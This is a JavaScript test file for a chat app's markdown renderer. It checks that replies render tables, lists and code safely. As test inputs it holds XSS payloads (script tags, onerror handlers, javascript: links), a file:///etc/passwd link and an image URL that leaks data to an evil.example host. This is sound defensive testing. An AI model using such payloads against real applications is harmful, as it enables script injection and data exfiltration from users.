import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { renderReply, externalLink } from "../src/desktop/renderer/message-markdown.js";

// A stand-in for the few DOM calls the renderer makes. It records what was
// built, so a test can walk it; anything the renderer did not call does not exist.
function fakeDocument() {
  const node = tag => ({
    tag, className: "", dataset: {}, children: [],
    append(...items) { for (const item of items) this.children.push(typeof item === "string" ? { text: item } : item); },
    set textContent(value) { this.children = [{ text: String(value) }]; },
    get textContent() { return this.children.map(child => child.text ?? child.textContent).join(""); },
  });
  return { createElement: node, createTextNode: text => ({ text }) };
}
const doc = fakeDocument();
const render = text => renderReply(text, doc);
const all = (root, predicate, out = []) => { for (const child of root.children ?? []) { if (child.tag && predicate(child)) out.push(child); all(child, predicate, out); } return out; };
const tags = root => all(root, () => true).map(node => node.tag);
const ALLOWED = new Set(["p", "h1", "h2", "h3", "h4", "h5", "h6", "ul", "ol", "li", "blockquote", "div", "table", "thead", "tbody", "tr", "th", "td",
  "strong", "em", "s", "code", "pre", "br", "hr", "a", "span"]);

test("a reply's table, headings, lists and code render as those elements", () => {
  const root = render([
    "# 本周进展", "", "## 数据", "",
    "| 项目 | 完成度 | 负责人 |", "|:--|:-:|--:|", "| 登录桥接 | 100% | 张三 |", "| 日程接入 | 80% | 李四 |", "",
    "1. 第一步", "2. 第二步", "", "3. 接着编号", "", "- 要点 **加粗** 和 *强调* 和 ~~删除~~ 和 `代码`", "",
    "> 引用一段", "", "```js", "const a = 1;", "```", "", "---", "结尾",
  ].join("\n"));
  assert.equal(root.className, "message-text markdown");
  assert.deepEqual(all(root, node => /^h\d$/.test(node.tag)).map(node => [node.tag, node.textContent]), [["h1", "本周进展"], ["h2", "数据"]]);
  const [table] = all(root, node => node.tag === "table");
  assert.equal(table.className, "md-table");
  assert.deepEqual(all(table, node => node.tag === "th").map(node => node.textContent), ["项目", "完成度", "负责人"]);
  assert.deepEqual(all(table, node => node.tag === "tr").slice(1).map(row => all(row, node => node.tag === "td").map(cell => cell.textContent)), [["登录桥接", "100%", "张三"], ["日程接入", "80%", "李四"]]);
  assert.deepEqual(all(table, node => node.tag === "th").map(node => node.className), ["md-align-left", "md-align-center", "md-align-right"]);
  assert.equal(all(root, node => node.className === "md-table-wrap").length, 1, "wide tables scroll inside their own box");
  const [ordered] = all(root, node => node.tag === "ol");
  assert.deepEqual(all(ordered, node => node.tag === "li").map(node => node.textContent), ["第一步", "第二步", "接着编号"], "a blank line inside a numbered list does not restart it");
  assert.equal(all(render("3. 从三开始\n4. 然后"), node => node.tag === "ol")[0].start, 3);
  const item = all(root, node => node.tag === "li").find(node => node.textContent.startsWith("要点"));
  assert.deepEqual(item.children.filter(child => child.tag).map(child => child.tag), ["strong", "em", "s", "code"], "a tight list item holds its text directly, without a <p>");
  assert.equal(all(root, node => node.tag === "blockquote")[0].textContent, "引用一段");
  const [pre] = all(root, node => node.tag === "pre");
  assert.equal(pre.dataset.language, "js");
  assert.equal(pre.textContent, "const a = 1;");
  assert.equal(all(root, node => node.tag === "hr").length, 1);
  for (const tag of tags(root)) assert.ok(ALLOWED.has(tag), tag);
});

test("single line breaks are kept, because replies are written line by line", () => {
  const root = render("第一行\n第二行");
  const [paragraph] = all(root, node => node.tag === "p");
  assert.deepEqual(paragraph.children.map(child => child.tag ?? child.text), ["第一行", "br", "第二行"]);
});

test("raw HTML in a reply is shown as its characters, never as elements", () => {
  const root = render('<script>alert(1)</script>\n\n<img src=x onerror="alert(2)"> 和 <a href="javascript:alert(3)">点</a>\n\n<iframe src="https://evil.example"></iframe>');
  for (const tag of tags(root)) assert.ok(ALLOWED.has(tag), tag);
  // The only anchor is the bare https address inside the iframe text, which is
  // an ordinary link a person may click; the tag around it is characters.
  assert.deepEqual(all(root, node => node.tag === "a").map(node => node.dataset.externalLink), ["https://evil.example/"]);
  assert.match(root.textContent, /<iframe src="https:\/\/evil\.example"><\/iframe>/);
  assert.match(root.textContent, /<script>alert\(1\)<\/script>/);
  assert.match(root.textContent, /<img src=x onerror="alert\(2\)">/);
});

test("only https links become clickable, and only through the external-link handler", () => {
  const root = render([
    "[飞书文档](https://example.feishu.cn/docx/abc) [明文](http://example.com) [脚本](javascript:alert(1))",
    "[文件](file:///etc/passwd) [相对](./report.md) [带密码](https://user:pw@example.com/) 裸链接 https://example.com/a?b=1",
  ].join("\n"));
  const anchors = all(root, node => node.tag === "a");
  assert.deepEqual(anchors.map(node => node.dataset.externalLink), ["https://example.feishu.cn/docx/abc", "https://example.com/a?b=1"]);
  for (const anchor of anchors) { assert.equal(anchor.className, "md-anchor"); assert.equal(anchor.href, anchor.dataset.externalLink); assert.equal(anchor.rel, "noreferrer noopener"); }
  const inert = all(root, node => node.className === "md-inert-link");
  assert.deepEqual(inert.map(node => node.textContent), ["明文", "相对", "带密码"], "the link text stays readable; the address is only in the tooltip");
  // markdown-it refuses javascript: and file: targets outright, so those stay the characters they were typed as.
  assert.match(root.textContent, /\[脚本\]\(javascript:alert\(1\)\)/);
  assert.match(root.textContent, /\[文件\]\(file:\/\/\/etc\/passwd\)/);
});

test("images are never fetched: a reply shows the description, and a link to open it on request", () => {
  const root = render("![季度图表](https://example.com/q3.png) ![内嵌](data:image/png;base64,iVBORw0KGgo=) ![外泄](http://evil.example/?d=secret)");
  assert.equal(all(root, node => node.tag === "img").length, 0);
  const images = all(root, node => node.className === "md-image");
  assert.deepEqual(images.map(node => node.children[0].text), ["[图片] 季度图表", "[图片] 内嵌", "[图片] 外泄"]);
  assert.deepEqual(all(root, node => node.tag === "a").map(node => node.dataset.externalLink), ["https://example.com/q3.png"]);
});

test("task list items show a box instead of the brackets", () => {
  const root = render("- [ ] 写周报\n- [x] 建日程\n- [链接](https://example.com)");
  assert.deepEqual(all(root, node => node.tag === "li").map(node => node.textContent), ["☐写周报", "☑建日程", "链接"]);
});

test("externalLink accepts https only, without credentials", () => {
  assert.equal(externalLink("https://example.com/x"), "https://example.com/x");
  for (const bad of ["http://example.com", "javascript:alert(1)", "file:///etc/passwd", "https://u:p@example.com", "data:text/html,x", "./x", "", null, "mailto:a@b.c"]) assert.equal(externalLink(bad), null, String(bad));
});

test("an oversized reply, or one past the token budget, is shown exactly as written", () => {
  const huge = "a|b\n".repeat(30_000);
  const root = render(huge);
  assert.equal(root.className, "message-text");
  assert.equal(root.textContent, huge);
  const many = render("- x\n".repeat(20_000));
  assert.equal(many.className, "message-text", "20 000 list items exceed the token budget");
});

test("hostile or malformed replies render quickly", () => {
  const size = 65_536;
  const cases = {
    "unclosed links": "[a](".repeat(size / 4), "backtick run": `x${"`".repeat(size)}`, "alternating ticks": "`a``".repeat(size / 4),
    "heading then spaces": `## T${" ".repeat(size)}end`, "stars": "*a".repeat(size / 2), "bold markers": "**a".repeat(size / 3),
    "image openers": "![a](".repeat(size / 5), "deep quote": ">".repeat(size), "nested lists": "- ".repeat(size / 2) + "x",
    "brackets": "[".repeat(size) + "]".repeat(size / 2), "emphasis nest": "*_".repeat(size / 2), "autolinks": "https://a.b/".repeat(size / 12),
    "wide table": "|a".repeat(2000) + "\n" + "|-".repeat(2000) + "\n" + "|x".repeat(2000),
  };
  for (const [name, text] of Object.entries(cases)) {
    const started = performance.now();
    const root = render(text);
    const elapsed = performance.now() - started;
    assert.ok(elapsed < 1500, `${name}: ${elapsed.toFixed(0)} ms`);
    for (const tag of tags(root)) assert.ok(ALLOWED.has(tag), `${name}: ${tag}`);
  }
});

test("the parser is the pinned markdown-it browser build", () => {
  const pkg = JSON.parse(readFileSync(new URL("../package.json", import.meta.url), "utf8"));
  assert.match(pkg.dependencies["markdown-it"], /^\d+\.\d+\.\d+$/, "pinned to an exact version");
  const source = readFileSync(new URL("../src/desktop/renderer/message-markdown.js", import.meta.url), "utf8");
  assert.match(source, /from "\.\.\/\.\.\/\.\.\/node_modules\/markdown-it\/dist\/browser\/markdown-it\.esm\.min\.mjs"/);
  assert.doesNotMatch(source, /innerHTML|outerHTML|insertAdjacentHTML|DOMParser|createContextualFragment/);
});
